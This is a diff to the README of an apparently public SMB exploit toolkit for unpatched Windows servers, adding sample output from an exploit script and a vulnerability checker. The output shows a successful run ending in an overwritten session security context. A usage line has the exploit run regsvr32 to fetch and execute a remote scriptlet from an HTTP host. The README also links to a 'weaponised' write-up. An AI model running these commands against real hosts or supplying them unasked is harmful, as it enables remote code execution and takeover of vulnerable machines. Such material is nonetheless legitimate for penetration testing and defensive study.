@@ -47,6 +47,31 @@ optional arguments:
   --version         show program's version number and exit
 Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
+
+Sample output:
+```
+> # python zzz_exploit.py -t 10.10.11.53                                                                                                                                                     
+[08:38:41]  [INFO]: 	TARGET: 10.10.11.53
+[08:38:41]  [ACTION]: 	CONNECTING TO TARGET...
+[08:38:41]  [ACTION]: 	GETTING TARGET OS...
+[08:38:41]  [INFO]: 	TARGET OS: Windows Server 2012 R2 Datacenter 9600
+[08:38:41]  [ACTION]: 	GETTING PIPE...
+[08:38:41]  [INFO]: 	USING PIPE: spoolss
+[08:38:41]  [INFO]: 	TARGET ARCHITECTURE: 64 bit
+[08:38:41]  [INFO]: 	FRAG SIZE: 0x20
+[08:38:41]  [INFO]: 	GROOM_POOL_SIZE: 0x5030
+[08:38:41]  [INFO]: 	BRIDE_TRANS_SIZE: 0xf90
+[08:38:41]  [INFO]: 	CONNECTION: 0xffffe001c6257910
+[08:38:41]  [INFO]: 	SESSION: 0xffffc000f987c810
+[08:38:41]  [INFO]: 	FLINK: 0xffffc000faf26098
+[08:38:41]  [INFO]: 	InParam: 0xffffc000faf2016c
+[08:38:41]  [INFO]: 	MID: 0x2203
+[08:38:41]  [SUCCESS]: 	SUCCESS CONTROLLING GROOM TRANSACTION
+[08:38:41]  [ACTION]: 	MODIFYING TRANS1 STRUCT FOR READ/WRITE
+[08:38:42]  [ACTION]: 	CREATING SYSTEM SESSION TO SMB...
+[08:38:42]  [ACTION]: 	OVERWRITING SESSION SECURITY CONTEXT
+[08:38:42]  [SUCCESS]: 	FINISHED!
+```
 I wrote an article using Korey's payload and the new changes to the script, please see it [here](https://mez0.cc/posts/weaponised-worawit.html)
 
 
@@ -68,6 +93,20 @@ optional arguments:
   --version         show program's version number and exit
 
 Example: python checker.py -t 192.168.0.1
+```
+Sample output:
+```
+> # python checker.py -t 10.10.11.53                                                                                                                                                         
+[08:37:25]  [INFO]: 	CONNECTED TO 10.10.11.53
+[08:37:25]  [INFO]: 	TARGET OS: Windows Server 2012 R2 Datacenter 9600
+[08:37:25]  [SUCCESS]: 	10.10.11.53 IS NOT PATCHED!
+[08:37:25]  [ACTION]: 	CHECKING NAMED PIPES...
+[08:37:25]  [SUCCESS]: 	spoolss: OK (64 bit)
+[08:37:26]  [SUCCESS]: 	samr: OK (64 bit)
+[08:37:26]  [SUCCESS]: 	netlogon: OK (64 bit)
+[08:37:26]  [SUCCESS]: 	lsarpc: OK (64 bit)
+[08:37:26]  [ERROR]: 	browser: STATUS_OBJECT_NAME_NOT_FOUND
+
 ```
 
 Any further ideas, changes or fixes; please let me know!
